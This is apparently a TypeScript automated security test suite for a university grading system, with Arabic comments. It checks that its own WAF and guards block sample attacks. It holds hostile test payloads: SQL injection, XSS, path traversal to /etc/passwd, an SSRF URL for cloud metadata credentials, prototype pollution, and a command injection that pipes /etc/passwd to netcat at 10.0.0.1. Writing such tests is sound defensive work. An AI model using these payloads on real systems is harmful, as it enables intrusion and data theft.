// 🛡️ حزمة الاختبارات الأمنية المؤتمتة والشاملة (Automated Security Test Suite 2026)
// 🏛️ جامعة الإمام جعفر الصادق (ع) - فرع ميسان - مسار بولونيا الأكاديمي

import { wafInspectString } from './waf-firewall'; // 🧱 جدار الـ WAF
import { detectSqlInjection } from './sql-injection-guard'; // 🛡️ كاشف SQLi
import { detectXss } from './xss-guard'; // 🛡️ كاشف XSS
import { validateUrlAgainstSsrf } from './ssrf-guard'; // 🌐 كاشف SSRF
import { deepSanitizePrototype } from './prototype-pollution-guard'; // 🔒 حارس الذاكرة
import { sanitizeGradeItem, BOLOGNA_GRADE_LIMITS } from './sanitizer'; // 🧹 معقم الدرجات
import { checkRateLimit } from './ddos-guard'; // ⏱️ محدد الطلبات

// 📋 هيكل نتيجة اختبار أمني فردي
export interface SecurityTestReportItem {
  id: string;                    // 🆔 رمز الاختبار
  category: string;              // 📂 الفئة (SQLi, XSS, RCE, LFI, SSRF, etc.)
  testName: string;              // 📝 اسم الاختبار
  passed: boolean;               // ✅ هل نجح الاختبار الأمني
  details: string;               // 📖 تفاصيل النتيجة
}

// 📊 هيكل التقرير الأمني الشامل
export interface SecurityTestSuiteSummary {
  totalTests: number;            // 🔢 إجمالي الاختبارات
  passedCount: number;           // ✅ الاختبارات الناجحة
  failedCount: number;           // ❌ الاختبارات الفاشلة
  securityScore: number;         // 💯 النسبة المئوية لدرجة الأمان
  timestamp: string;             // ⏰ توقيت الفحص
  results: SecurityTestReportItem[]; // 📋 قائمة النتائج التفصيلية
}

// 🚀 دالة تشغيل كافة الاختبارات الأمنية المؤتمتة للمنظومة (Run Full Security Test Suite)
export function runAutomatedSecurityTestSuite(): SecurityTestSuiteSummary {
  const results: SecurityTestReportItem[] = [];

  // 1️⃣ اختبار 1: كشف وحظر حقن SQL متقدم (SQLi Detection)
  const sqliPayload = "' UNION SELECT id, generated_email, role FROM profiles WHERE '1'='1";
  const sqliWaf = wafInspectString(sqliPayload);
  const sqliGuard = detectSqlInjection(sqliPayload);
  const sqliPassed = !sqliWaf.isSafe && !sqliGuard.isSafe;
  results.push({
    id: 'SEC-TEST-01',
    category: 'SQL Injection',
    testName: 'فحص اعتراض حقن SQL المركب (UNION SELECT)',
    passed: sqliPassed,
    details: sqliPassed 
      ? `✅ تم حظر هجوم الـ SQLi بنجاح (درجة الشذوذ: ${sqliWaf.anomalyScore}/5).`
      : '❌ فشل في اعتراض حقن SQL.',
  });

  // 2️⃣ اختبار 2: كشف وحظر حقن السكربتات XSS (XSS Detection)
  const xssPayload = '<svg/onload=alert(document.domain)>';
  const xssWaf = wafInspectString(xssPayload);
  const xssGuard = detectXss(xssPayload);
  const xssPassed = !xssWaf.isSafe && !xssGuard.isSafe;
  results.push({
    id: 'SEC-TEST-02',
    category: 'Cross-Site Scripting',
    testName: 'فحص اعتراض وسوم وأحداث XSS الملتوية (SVG Onload)',
    passed: xssPassed,
    details: xssPassed 
      ? `✅ تم حظر هجوم XSS وتطهير الوسم بنجاح.`
      : '❌ فشل في اعتراض وسوم XSS.',
  });

  // 3️⃣ اختبار 3: كشف وحظر تنفيذ أوامر النظام RCE (Command Injection)
  const rcePayload = '; $(whoami); cat /etc/passwd | nc 10.0.0.1 4444';
  const rceWaf = wafInspectString(rcePayload);
  const rcePassed = !rceWaf.isSafe;
  results.push({
    id: 'SEC-TEST-03',
    category: 'RCE / Command Injection',
    testName: 'فحص اعتراض تنفيذ أوامر الخادم (Command Injection $(whoami))',
    passed: rcePassed,
    details: rcePassed 
      ? `✅ تم اعتراض محاولة RCE وحظرها فوراً بـ WAF Rule (CRS-932-100).`
      : '❌ فشل في اعتراض أمر النظام.',
  });

  // 4️⃣ اختبار 4: كشف وحظر اجتياز المسارات LFI (Path Traversal)
  const lfiPayload = '../../../../etc/passwd%00';
  const lfiWaf = wafInspectString(lfiPayload);
  const lfiPassed = !lfiWaf.isSafe;
  results.push({
    id: 'SEC-TEST-04',
    category: 'LFI / Path Traversal',
    testName: 'فحص اعتراض اجتياز المسارات وقراءة ملفات النظام (/etc/passwd)',
    passed: lfiPassed,
    details: lfiPassed 
      ? `✅ تم اعتراض LFI بنجاح وحظر محاولة قراءة ملفات السيرفر.`
      : '❌ فشل في اعتراض اجتياز المسار.',
  });

  // 5️⃣ اختبار 5: كشف وحظر استدعاء العناوين السحابية الخاصة SSRF (SSRF Protection)
  const ssrfPayload = 'http://169.254.169.254/latest/meta-data/iam/security-credentials/';
  const ssrfCheck = validateUrlAgainstSsrf(ssrfPayload);
  const ssrfPassed = !ssrfCheck.isSafe;
  results.push({
    id: 'SEC-TEST-05',
    category: 'SSRF',
    testName: 'فحص حظر استدعاء خوادم السحابة والـ Loopback (169.254.169.254)',
    passed: ssrfPassed,
    details: ssrfPassed 
      ? `✅ تم حظر رابط الـ SSRF بنجاح وعزل عنوان Cloud Metadata.`
      : '❌ فشل في حظر عنوان الـ SSRF.',
  });

  // 6️⃣ اختبار 6: حماية الذاكرة من تلويث النموذج الأولي (Prototype Pollution)
  const protoPayload = JSON.parse('{"__proto__": {"isAdmin": true}, "title": "مادة آمنة"}');
  const protoCheck = deepSanitizePrototype(protoPayload);
  const protoPassed = !protoCheck.isSafe && !('__proto__' in (protoCheck.sanitized as object));
  results.push({
    id: 'SEC-TEST-06',
    category: 'Prototype Pollution',
    testName: 'فحص تطهير الكائنات وحذف المفاتيح الملوثة للنموذج الأولي (__proto__)',
    passed: protoPassed,
    details: protoPassed 
      ? `✅ تم اكتشاف وتجريد مفتاح __proto__ وحماية كائنات الذاكرة بنجاح.`
      : '❌ فشل في تطهير الـ Prototype Pollution.',
  });

  // 7️⃣ اختبار 7: حصر درجات بولونيا وضمان عدم التلاعب بالسقوف (Business Logic Safety)
  const hackedQuizGrade = 999; // سقف الكويز هو 5 درجات
  const sanitizedQuiz = sanitizeGradeItem(hackedQuizGrade, BOLOGNA_GRADE_LIMITS.quiz1);
  const logicPassed = sanitizedQuiz === 5;
  results.push({
    id: 'SEC-TEST-07',
    category: 'Business Logic Security',
    testName: 'فحص حصر وتقييد درجات بولونيا ومنع التلاعب بالسقف (Quiz limit: 5)',
    passed: logicPassed,
    details: logicPassed 
      ? `✅ تم حصر الدرجة بالسقف النظامي (القيمة المدخلة: 999 -> المقبولة: 5).`
      : '❌ فشل في ضبط سقف الدرجة الأكاديمية.',
  });

  // 8️⃣ اختبار 8: التحقق من فاعلية محدد الطلبات Rate Limiting
  const rateLimitResult = checkRateLimit('test_security_audit_ip', 'SEARCH_QUERY');
  const rateLimitPassed = rateLimitResult.allowed === true && typeof rateLimitResult.remaining === 'number';
  results.push({
    id: 'SEC-TEST-08',
    category: 'Rate Limiting',
    testName: 'فحص فاعلية محدد الطلبات الذكي ومصفوفة السقوف اللحظية',
    passed: rateLimitPassed,
    details: rateLimitPassed 
      ? `✅ محدد الطلبات يعمل بدقة عالية (المتبقي: ${rateLimitResult.remaining}).`
      : '❌ فشل في فحص Rate Limiter.',
  });

  // 🧮 حساب الإحصائيات الشاملة
  const totalTests = results.length;
  const passedCount = results.filter(r => r.passed).length;
  const failedCount = totalTests - passedCount;
  const securityScore = Math.round((passedCount / totalTests) * 100);

  return {
    totalTests,
    passedCount,
    failedCount,
    securityScore,
    timestamp: new Date().toISOString(),
    results,
  };
}
